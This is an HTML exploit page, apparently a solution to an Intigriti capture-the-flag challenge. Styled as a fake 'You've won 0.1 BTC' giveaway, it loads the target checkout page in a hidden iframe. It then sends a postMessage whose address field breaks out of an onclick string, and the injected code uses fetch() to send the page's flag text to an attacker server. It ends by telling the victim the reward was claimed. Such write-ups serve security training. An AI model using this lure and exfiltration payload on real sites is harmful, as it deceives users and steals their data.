<!DOCTYPE html>
<html>
<head>
    <title>Free Crypto Bonus!</title>
    <style>
        body { 
            font-family: Arial; 
            text-align: center; 
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        h1 { font-size: 48px; margin-bottom: 20px; }
        p { font-size: 24px; }
        .loading { 
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>üéÅ Congratulations!</h1>
    <p>You've won 0.1 BTC!</p>
    <p>Processing your reward...</p>
    <div class="loading"></div>
    
    <!-- Hidden iframe targeting victim's checkout page -->
    <iframe 
        id="target" 
        src="https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=50000" 
        style="display:none;"
    ></iframe>

    <script>
        // Wait for iframe to fully load
        setTimeout(() => {
            // Exploit payload - breaks out of onclick string context
            const payload = "',fetch('https://YOUR-SERVER.com/?flag='+encodeURIComponent(document.getElementById('flagText').textContent)),'";
            
            // Send malicious transaction via postMessage
            document.getElementById('target').contentWindow.postMessage({
                type: 'submitTransaction',
                transaction: {
                    toAddress: payload,
                    currency: 'BTC',
                    amount: 0.001
                }
            }, '*');
            
            // Give feedback to victim
            setTimeout(() => {
                document.body.innerHTML = '<h1>‚úì Reward Claimed!</h1><p>Check your wallet in 24 hours.</p>';
            }, 3000);
        }, 3000);
    </script>
</body>
</html>
